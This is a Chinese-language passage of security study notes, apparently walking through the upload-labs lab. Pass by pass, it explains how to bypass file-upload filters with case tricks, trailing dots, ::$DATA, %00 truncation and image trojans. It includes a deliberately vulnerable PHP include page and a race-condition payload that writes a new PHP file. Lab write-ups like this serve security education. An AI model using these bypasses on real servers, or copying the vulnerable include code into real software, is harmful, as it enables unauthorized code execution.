class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件不允许上传!&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Pass05&lt;/p&gt;
&lt;p&gt;PhP 通过大小写绕过&lt;/p&gt;
&lt;p&gt;只在 Windows 下使用，因为 Windows 不区分大小写&lt;/p&gt;
&lt;p&gt;Pass06&lt;/p&gt;
&lt;p&gt;在提交时在文件末尾加空格绕过后缀检测，Windows 服务端会自动去除，但 php 可以识别空格&lt;/p&gt;
&lt;p&gt;通过抓包修改&lt;/p&gt;
&lt;p&gt;Pass07&lt;/p&gt;
&lt;p&gt;后缀加.，Windows 忽略文件后的.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701454141-fc96f35c-12db-4bb3-a9b5-ccbc57e77c58.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Pass08&lt;/p&gt;
&lt;p&gt;当从 Windows shell 命令行指定创建文件时，流的完整名称为 “&lt;strong&gt;filename&lt;/strong&gt;:&lt;strong&gt;stream name&lt;/strong&gt;:&lt;strong&gt;stream type&lt;/strong&gt;”，如示例中所示： “myfile.txt:stream1:$DATA”&lt;/p&gt;
&lt;p&gt;::&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mtext&gt;数据流。默认数据流没有名称。对&lt;/mtext&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mtext&gt;格式下的一个文件而言，至少包含一个流，即&lt;/mtext&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;流（其&lt;/mtext&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;为&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;DATA  数据流。 默认数据流没有名称。对NTFS格式下的一个文件而言，至少包含一个流，即data流（其stream type为&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;据&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;流&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;。&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;默&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;认&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;据&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;流&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;没&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;有&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;名&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;称&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;。&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;对&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;格&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;式&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;下&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;一&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;文&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;件&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;而&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;言&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;至&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;少&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;包&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;含&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;一&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;流&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;即&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;流&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;其&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; DATA），data 流是文件的主流，默认的 data 流其 stream name 为空。默认一个文件如果被指定了流，而该流没有 stream type 的话会在存储时自动添加 $DATA。&lt;/p&gt;
&lt;p&gt;在 window 的时候如果文件名 + &lt;code&gt;&amp;quot;::$DATA&amp;quot;&lt;/code&gt;  会把 &lt;code&gt;::$DATA&lt;/code&gt;  之后的数据当成文件流处理，不会检测后缀名，且保持 &lt;code&gt;::$DATA&lt;/code&gt;  之前的文件名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641701582526-a5e593cd-a5a6-4472-8185-b8c142d207ae.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;php 开发模式下 php -S localhost:9090           php 版本 &amp;lt; 7&lt;/p&gt;
&lt;p&gt;localhost:9090/web.php.  会造成任意文件下载和源码读取&lt;/p&gt;
&lt;p&gt;localhost:9090/web.PHP  源码读取&lt;/p&gt;
&lt;p&gt;Pass09&lt;/p&gt;
&lt;p&gt;&lt;code&gt;test.php. .   &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;test.php. .     &lt;/code&gt;   // 最后还有一个空格&lt;/p&gt;
&lt;p&gt;trim 两次，去 dot 一次，剩下一个点绕过&lt;/p&gt;
&lt;p&gt;Pass10&lt;/p&gt;
&lt;p&gt;后缀被替换为空&lt;/p&gt;
&lt;p&gt;teat.pphphp&lt;/p&gt;
&lt;p&gt;str_ireplace 可以连续过滤多次，比如 phpphp&lt;/p&gt;
&lt;p&gt;test11&lt;/p&gt;
&lt;p&gt;%00 截断 (get 截断) 文件可控&lt;/p&gt;
&lt;p&gt;PHP 底层用 c 语言，c 语言中 \0 是结束符&lt;/p&gt;
&lt;p&gt;在 PHP 中 get 方法使用 %00 进行截断，而 get 是 url 传参，url 解码后，%00 就是 \0&lt;/p&gt;
&lt;p&gt;截断后原本的文件名被截断导致随机数被丢失&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$img_path = $_GET[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_path&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.$file_ext;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715548691-bb017a2c-3516-48af-ab83-13a2cf1828ca.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221025161153164.png&#34; alt=&#34;image-20221025161153164&#34;&gt;&lt;/p&gt;
&lt;p&gt;截断条件 PHP&amp;lt;5.3.29 GPC 关闭&lt;/p&gt;
&lt;p&gt;php%00 截断&lt;/p&gt;
&lt;p&gt;1. 上传时路径可控，使用 00 截断&lt;/p&gt;
&lt;p&gt;2. 文件下载时，00 截断绕过白名单检查&lt;/p&gt;
&lt;p&gt;3. 文件包含时，00 截断后面限制 (主要是本地包含时)&lt;/p&gt;
&lt;p&gt;4. 其它与文件操作有关的地方都可能使用 00 截断。&lt;/p&gt;
&lt;p&gt;Pass12&lt;/p&gt;
&lt;p&gt;post 截断&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$img_path = $_POST[&amp;#x27;save_path&amp;#x27;].&amp;quot;/&amp;quot;.rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_ext;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641716003160-187aa0eb-ac1d-4b9d-8250-dac1ac8499aa.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715928171-812d6b71-ffa2-47ac-afab-5e5577c11eb3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;25 改为 00&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/2759285/1641715981547-19efbd93-4201-4301-91e8-916dbca04d31.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者将 %00urldecode&lt;/p&gt;
&lt;p&gt;Pass 13 文件包含&lt;/p&gt;
&lt;p&gt;只读前两个字节&lt;/p&gt;
&lt;p&gt;1. 上传图片码&lt;/p&gt;
&lt;p&gt;copy xxxx.jpg /b + test.php /a test1.jpg&lt;/p&gt;
&lt;p&gt;2. 文件包含，他写了一个 include.php 作为文件包含&lt;/p&gt;
&lt;?php 

include demo.jpg

?&gt;
&lt;p&gt;会将包含的文件当做 PHP 执行&lt;/p&gt;
&lt;p&gt;include 时文件不能可控&lt;/p&gt;
&lt;p&gt;127.0.0.1/include.php?file=./upload/1.jpg&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;本页面存在文件包含漏洞，用于测试图片马是否能正常运行！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/html;charset=utf-8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(isset(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    include &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    show_source(__file__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Pass14&lt;/p&gt;
&lt;p&gt;==Pass13&lt;/p&gt;
&lt;p&gt;Pass16&lt;/p&gt;
&lt;p&gt;重新生成文件导致木马无效&lt;/p&gt;
&lt;p&gt;通过 payload 将木马插入到没有被打乱的部分，实现木马&lt;/p&gt;
&lt;p&gt;png 和 jpg 都会有不被打乱的部分&lt;/p&gt;
&lt;p&gt;通过脚本找到没有被打乱的部分&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjY1NyN0b2MtMg==&#34;&gt;https://xz.aliyun.com/t/2657#toc-2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Pass17&lt;/p&gt;
&lt;p&gt;时间竞争 文件先上传后判断，导致上传后出现，一旦出现资源占用时，rename 操作被中断，可以生成&lt;/p&gt;
&lt;p&gt;上传一下文件，通过 intruder 连续上传，web.php&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?php fputs(fopen(&#39;../haha.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;);&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在访问 web.php，访问时抓包，送到 intruder，一旦访问到，则会在上级目录生成 haha.php&lt;/p&gt;
&lt;p&gt;解决：先判断，如果后缀不对别上传&lt;/p&gt;
&lt;p&gt;写到上级目录防止递归删除文件夹中全部内容，如果不是递归删除，生成在当前目录也行&lt;/p&gt;
&lt;p&gt;Pass19&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.&lt;/code&gt;  截断&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIwMDQzMDMy&#34;&gt;https://blog.csdn.net/weixin_47306547/article/details/120043032&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;文件上传防御与绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传防御与绕过&#34;&gt;#&lt;/a&gt; 文件上传防御与绕过&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;前端验证&lt;/p&gt;
&lt;p&gt;白名单过滤后缀 .gif|.jpg|.png&lt;/p&gt;
&lt;p&gt;content-type 检测 image/jpeg  image/png  image/gif&lt;/p&gt;
&lt;p&gt;黑名单过滤：限制 php，asp，jsp，jspx&lt;/p&gt;
&lt;p&gt;exif_imagetype 文件头检测&lt;/p&gt;
&lt;p&gt;二次渲染&lt;/p&gt;
&lt;p&gt;先判断在上传&lt;/p&gt;
&lt;p&gt;随机方式重命名&lt;/p&gt;
&lt;p&gt;文件夹取消执行权限&lt;/p&gt;
&lt;p&gt;在临时文件夹解压&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;绕过办法：&lt;/p&gt;
&lt;p&gt;1. 文件大小写绕过（Php ，PhP pHp，等）&lt;/p&gt;
&lt;p&gt;2. 黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\x00hh\x46php&lt;/p&gt;
&lt;p&gt;3. 特殊文件名绕过&lt;br&gt;
 1）修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格) 由于这种命名格式在&lt;br&gt;
 windows 系统里是不允许的，所以在绕过上传之后 windows 系统会自动去掉。点和空格。Linux 和&lt;br&gt;
 Unix 中没有这个特性。&lt;br&gt;
2）::$DATA (php 在 windows 的时候如果文件名 +&amp;quot;::DATA&amp;quot; 会把::DATA 之后的数据当作文件流处&lt;br&gt;
理，不会检测后缀名，且保持 &amp;quot;::DATA&amp;quot; 之前的文件名，其目的就是不检查后缀名)&lt;/p&gt;
&lt;p&gt;4.0x00 截断绕过（5.2 C 语言中将 \0 当作字符串的结尾）&lt;/p&gt;
&lt;p&gt;5.htaccess 文件攻击（结合黑名单攻击）&lt;/p&gt;
&lt;p&gt;6. 解析绕过&lt;/p&gt;
&lt;p&gt;7. 修改 content-type 字段&lt;/p&gt;
&lt;p&gt;8. 关闭浏览器 js&lt;/p&gt;
&lt;p&gt;9. 使用图片马配合文件包含&lt;/p&gt;
&lt;p&gt;10. 修改文件头&lt;/p&gt;
&lt;p&gt;JPG&lt;br&gt;
 &lt;code&gt;FF D8 FF E0 00 10 4A 46 49 46&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;GIF&lt;br&gt;
 &lt;code&gt;47 49 46 38 39 61&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;(相当于文本的 GIF89a)&lt;/p&gt;
&lt;p&gt;PNG&lt;br&gt;
 &lt;code&gt;89 50 4E 47&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/9113969-cf4c7c27a2bea500.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;phpiiswindows-文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpiiswindows-文件上传&#34;&gt;#&lt;/a&gt; php+IIS+Windows 文件上传&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//U-Mail demo ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/[^\w]/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//过滤除了a-zA-Z0-9以外的内容&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 